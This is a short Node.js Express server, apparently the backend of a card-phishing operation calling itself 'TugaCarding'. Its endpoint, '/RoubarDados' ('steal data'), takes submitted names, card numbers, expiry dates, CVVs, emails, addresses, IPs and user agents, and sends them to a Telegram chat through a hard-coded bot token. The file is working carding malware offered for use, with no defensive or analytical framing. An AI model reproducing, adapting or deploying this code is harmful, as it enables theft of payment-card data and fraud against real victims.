const express = require('express');
const app = express();
const useragent = require('express-useragent');

app.use(useragent.express());


const TelegramBot = require('node-telegram-bot-api');
const token = '6553152118:AAGEsyucl1jg746upMgoz4Jema7VCXJu74c';
const bot = new TelegramBot(token, {polling: true});

app.use(express.urlencoded({
  extended: true
}));

app.post('/RoubarDados', (req, res) => {
    const nome = req.body.nome;
    const numeroCartao = req.body.numcartao;
    const dataValidade = req.body.valcartao;
    const codigoCartao = req.body.codcartao;
    const email = req.body.email;
    const morada = req.body.morada;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.useragent;


    //console.log('Nome - ' + nome);console.log('Numero cartao - ' + numeroCartao);console.log('Data Validade - ' + dataValidade);console.log('CVV - ' + codigoCartao);console.log('Email - ' + email);console.log('Morada - ' + morada);console.log('IP - ' + ip);console.log(userAgent);

    res.end();

    //-986473650
    const chatID = '-986473650';
    const paraEnviar = '🟩🟩🟩🟩🟩🟩🟨🟨🟨🟥🟥🟥🟥🟥🟥\n\n Novo cartão dumped by TugaCarding\n\n🟩🟩🟩🟩🟩🟩🟨🟨🟨🟥🟥🟥🟥🟥🟥\n\n🙃 Nome - ' + nome + '\n🗺️ Morada -'+ morada + '\n📧 Email - ' + email + '\n💳 Número do cartão - ' + numeroCartao + '\n📅 Data de validade - ' + dataValidade + '\n🔑 CVV - ' + codigoCartao + '\n\n📍 IP - ' + ip + '\n💻 User Agent - ' + userAgent.source + '\n\n🟩🟩🟩🟩🟩🟩🟨🟨🟨🟥🟥🟥🟥🟥🟥';
    bot.sendMessage(chatID, paraEnviar);

})



  app.listen(2000, () => {
    console.log('API ON!')
  });
